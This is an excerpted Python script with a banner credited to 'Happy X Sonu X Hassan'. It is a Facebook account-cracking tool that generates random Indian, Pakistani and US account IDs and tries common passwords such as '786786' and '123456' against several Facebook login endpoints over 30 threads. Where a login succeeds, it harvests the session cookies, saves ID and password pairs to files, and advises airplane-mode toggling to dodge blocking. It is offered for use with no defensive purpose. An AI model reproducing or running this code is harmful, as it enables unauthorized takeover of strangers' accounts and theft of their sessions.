...
\033[1;37;1m[+]==============================================
\t \033[1;37m\033[1;41m RANDOM CLONING \033[0m\033[1;37m
Author    : Happy X Sonu X Hassan
Github    : Happy120
Facebook  : H9PPY
Tool Type : Random
\033[1;37;1m[+]==============================================
        \033[1;37m\033[1;41m.     HAPPY GIRI HERE.    \033[0m\033[1;37m
\033[1;37;1m[+]=============================================="""  
loop = 0
oks = []
cps = []
...
def menu():
	os.system('clear')
	print(logo)
	print('[1] Random Indian Uid Crack')
	print('[2] Random  Pak Uid Crack')
	print('[3] Random USA Old Uid Crack')
	print('[0] Exit')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
...
def Ind():
	os.system('clear')
	print(logo)
	print('[1] Method [\x1b[1;92mFree.Facebook.com\x1b[1;97m] ')
	print('[2] Method [\x1b[1;92mMbasic.Facebook.com\x1b[1;97m] ')
	print('[3] Method [\x1b[1;92mM.Facebook.com\x1b[1;97m] ')
	print('[4] Method [\x1b[1;92mWww.facebook.com\x1b[1;97m] ')
	print('[0] Back')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write('\r [\033[1;92mIHAPPY-XD\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]  \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[Happy-OK] '+cid+' | '+ps+'\033[1;32m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r [\033[1;92mHappy-XD\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]  \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
			ua = random.choice(syed)
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[HAPPY-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in SXS_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HAPPY-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[HAPPY-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/HAPPY-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/HAPPY-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[Happy-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def method1p():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Pak Enter Five Digit Code (92310)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru, kode+guru, '786786', '000786']
			yaari.submit(mcrackp,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
...
def mcrackp(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r [\033[1;92mHappy-XD\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			ua = random.choice(syed)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[HAPPY-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
...
def method2p():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru, kode+guru, '786786', '000786']
			yaari.submit(fcrackp,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
...
def method3p():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru, kode+guru, '786786', '000786']
			yaari.submit(mbcrackp,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
...
def method4p():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru, kode+guru, '786786', '000786']
			yaari.submit(wwwcrackp,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
...
def method1u():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Usa Enter Five Digit Code (18554)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;91mUSA\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru, '123456', '1234567', '123456789']
			yaari.submit(mcracku,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
...
def method2u():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru, '123456', '1234567', '123456789']
			yaari.submit(fcracku,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
...
def method3u():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru, '123456', '1234567', '123456789']
			yaari.submit(mbcracku,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
...
def method4u():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru, '123456', '1234567', '123456789']
			yaari.submit(wwwcracku,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[Happy-OK] '+uid+' | '+ps+'\033[1;32m')
				cek_apk(session,coki)
